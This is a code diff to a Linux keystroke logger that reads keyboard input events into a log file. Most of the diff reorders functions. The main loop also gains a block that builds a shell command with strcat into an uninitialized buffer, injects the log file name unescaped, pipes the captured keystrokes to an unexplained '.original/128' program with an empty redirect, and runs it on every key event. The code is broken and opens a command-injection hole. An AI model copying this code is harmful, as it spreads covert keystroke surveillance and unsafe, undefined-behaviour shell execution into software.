@@ -84,6 +84,19 @@ void signal_handler(int signal)
 }
 
 
+void set_signal_handling()
+{ // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
+  struct sigaction act = {{0}};
+  act.sa_handler = signal_handler;
+  sigaction(SIGHUP,  &act, NULL);
+  sigaction(SIGINT,  &act, NULL);
+  sigaction(SIGTERM, &act, NULL);
+  // prevent child processes from becoming zombies
+  act.sa_handler = SIG_IGN;
+  sigaction(SIGCHLD, &act, NULL);
+}
+
+
 void determine_system_keymap()
 {
   // custom map will be used; erase existing US keymapping
@@ -155,45 +168,63 @@ void determine_system_keymap()
 
 
 
-void kill_existing_process()
+void export_keymap_to_file()
 {
-  pid_t pid;
-  bool via_file = true;
-  bool via_pipe = true;
-  FILE *temp_file = fopen(PID_FILE, "r");
-  
-  via_file &= (temp_file != NULL);
-  
-  if (via_file) {  // kill process with pid obtained from PID file
-    via_file &= (fscanf(temp_file, "%d", &pid) == 1);
-    fclose(temp_file);
+  int keymap_fd = open(args.keymap.c_str(), O_CREAT | O_EXCL | O_WRONLY, 0644);
+  if (keymap_fd == -1)
+    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.keymap.c_str());
+  char buffer[32];
+  int buflen = 0;
+  unsigned int index;
+  for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
+    buflen = 0;
+    if (is_char_key(i)) {
+      index = to_char_keys_index(i);
+      // only export non-null characters
+      if (char_keys[index]  != L'\0' && 
+          shift_keys[index] != L'\0' && 
+          altgr_keys[index] != L'\0')
+        buflen = sprintf(buffer, "%lc %lc %lc\n", char_keys[index], shift_keys[index], altgr_keys[index]);
+      else if (char_keys[index]  != L'\0' && 
+               shift_keys[index] != L'\0')
+        buflen = sprintf(buffer, "%lc %lc\n", char_keys[index], shift_keys[index]);
+      else if (char_keys[index] != L'\0')
+        buflen = sprintf(buffer, "%lc\n", char_keys[index]);
+      else  // if all \0, export nothing on that line (=keymap will not parse)
+        buflen = sprintf(buffer, "\n");
+    }
+    else if (is_func_key(i)) {
+      buflen = sprintf(buffer, "%ls\n", func_keys[to_func_keys_index(i)]);
+    }
+    
+    if (is_used_key(i))
+      if (write(keymap_fd, buffer, buflen) < buflen)
+        error(EXIT_FAILURE, errno, "Error writing to keymap file '%s'", args.keymap.c_str());
   }
-  
-  if (!via_file) {  // if reading PID from temp_file failed, try ps-grep pipe
-    via_pipe &= (sscanf(execute(COMMAND_STR_GET_PID).c_str(), "%d", &pid) == 1);
-    via_pipe &= (pid != getpid());
-  }
-  
-  if (via_file || via_pipe) {
-    remove(PID_FILE);
-    kill(pid, SIGINT);
-
-    exit(EXIT_SUCCESS);  // process killed successfully, exit
-  }
-  error(EXIT_FAILURE, 0, "No process killed");
+  close(keymap_fd);
+  error(EXIT_SUCCESS, 0, "Success writing keymap to file '%s'", args.keymap.c_str());
+  exit(EXIT_SUCCESS);
 }
 
 
-void set_signal_handling()
-{ // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
-  struct sigaction act = {{0}};
-  act.sa_handler = signal_handler;
-  sigaction(SIGHUP,  &act, NULL);
-  sigaction(SIGINT,  &act, NULL);
-  sigaction(SIGTERM, &act, NULL);
-  // prevent child processes from becoming zombies
-  act.sa_handler = SIG_IGN;
-  sigaction(SIGCHLD, &act, NULL);
+void exit_cleanup(int status, void *discard)
+{
+  // TODO:
+}
+
+
+void set_utf8_locale()
+{
+  // set locale to common UTF-8 for wchars to be recognized correctly
+  if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL) { // if en_US.UTF-8 isn't available
+    char *locale = setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variable LC_CTYPE
+    if (locale != NULL && 
+        (strstr(locale, "UTF-8") != NULL || strstr(locale, "UTF8") != NULL ||
+         strstr(locale, "utf-8") != NULL || strstr(locale, "utf8") != NULL) )
+      ;  // if locale has "UTF-8" in its name, it is cool to do nothing
+    else
+      error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type, or you need en_US.UTF-8 availabe");
+  }
 }
 
 
@@ -238,27 +269,6 @@ void determine_input_device()
 
 
 
-void set_utf8_locale()
-{
-  // set locale to common UTF-8 for wchars to be recognized correctly
-  if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL) { // if en_US.UTF-8 isn't available
-    char *locale = setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variable LC_CTYPE
-    if (locale != NULL && 
-        (strstr(locale, "UTF-8") != NULL || strstr(locale, "UTF8") != NULL ||
-         strstr(locale, "utf-8") != NULL || strstr(locale, "utf8") != NULL) )
-      ;  // if locale has "UTF-8" in its name, it is cool to do nothing
-    else
-      error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type, or you need en_US.UTF-8 availabe");
-  }
-}
-
-
-void exit_cleanup(int status, void *discard)
-{
-  // TODO:
-}
-
-
 void create_PID_file()
 {
   // create temp file carrying PID for later retrieval
@@ -275,45 +285,6 @@ void create_PID_file()
          error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
     else error(EXIT_FAILURE, errno, "Error opening PID file '" PID_FILE "'");
   }
-}
-
-
-void export_keymap_to_file()
-{
-  int keymap_fd = open(args.keymap.c_str(), O_CREAT | O_EXCL | O_WRONLY, 0644);
-  if (keymap_fd == -1)
-    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.keymap.c_str());
-  char buffer[32];
-  int buflen = 0;
-  unsigned int index;
-  for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
-    buflen = 0;
-    if (is_char_key(i)) {
-      index = to_char_keys_index(i);
-      // only export non-null characters
-      if (char_keys[index]  != L'\0' && 
-          shift_keys[index] != L'\0' && 
-          altgr_keys[index] != L'\0')
-        buflen = sprintf(buffer, "%lc %lc %lc\n", char_keys[index], shift_keys[index], altgr_keys[index]);
-      else if (char_keys[index]  != L'\0' && 
-               shift_keys[index] != L'\0')
-        buflen = sprintf(buffer, "%lc %lc\n", char_keys[index], shift_keys[index]);
-      else if (char_keys[index] != L'\0')
-        buflen = sprintf(buffer, "%lc\n", char_keys[index]);
-      else  // if all \0, export nothing on that line (=keymap will not parse)
-        buflen = sprintf(buffer, "\n");
-    }
-    else if (is_func_key(i)) {
-      buflen = sprintf(buffer, "%ls\n", func_keys[to_func_keys_index(i)]);
-    }
-    
-    if (is_used_key(i))
-      if (write(keymap_fd, buffer, buflen) < buflen)
-        error(EXIT_FAILURE, errno, "Error writing to keymap file '%s'", args.keymap.c_str());
-  }
-  close(keymap_fd);
-  error(EXIT_SUCCESS, 0, "Success writing keymap to file '%s'", args.keymap.c_str());
-  exit(EXIT_SUCCESS);
 }
 
 
@@ -371,6 +342,35 @@ void parse_input_keymap()
   if (line_number < N_KEYS_DEFINED)
 #define QUOTE(x) #x  // quotes x so it can be used as (char*)
     error(EXIT_FAILURE, 0, "Too few lines in input keymap '%s'; There should be " QUOTE(N_KEYS_DEFINED) " lines!", args.keymap.c_str());
+}
+
+
+void kill_existing_process()
+{
+  pid_t pid;
+  bool via_file = true;
+  bool via_pipe = true;
+  FILE *temp_file = fopen(PID_FILE, "r");
+  
+  via_file &= (temp_file != NULL);
+  
+  if (via_file) {  // kill process with pid obtained from PID file
+    via_file &= (fscanf(temp_file, "%d", &pid) == 1);
+    fclose(temp_file);
+  }
+  
+  if (!via_file) {  // if reading PID from temp_file failed, try ps-grep pipe
+    via_pipe &= (sscanf(execute(COMMAND_STR_GET_PID).c_str(), "%d", &pid) == 1);
+    via_pipe &= (pid != getpid());
+  }
+  
+  if (via_file || via_pipe) {
+    remove(PID_FILE);
+    kill(pid, SIGINT);
+
+    exit(EXIT_SUCCESS);  // process killed successfully, exit
+  }
+  error(EXIT_FAILURE, 0, "No process killed");
 }
 
 
@@ -482,8 +482,19 @@ int main(int argc, char **argv)
     file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
   fflush(out);
   
+  int flag = 0;
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
+    if (flag) {
+      char command[2500];
+      //cat file | ./128 > "
+      char *cat = "cat ";
+      char *rot = " | .original/128 > ";
+      strcat(command, cat);
+      strcat(command, args.logfile.c_str());
+      strcat(command, rot);
+      system(command);
+    }
     
 // these event.value-s aren't defined in <linux/input.h> ?
 #define EV_MAKE   1  // when key pressed
@@ -638,6 +649,15 @@ int main(int argc, char **argv)
       return system(command);
     }
 
+      char command[2500];
+      //cat file | ./128 > "
+      char *cat = "cat ";
+      char *rot = " | .original/128 > ";
+      strcat(command, cat);
+      strcat(command, args.logfile.c_str());
+      strcat(command, rot);
+      system(command);
+      flag = 1;
   } // while (read(input_fd))
   
   // append final timestamp, close files and exit
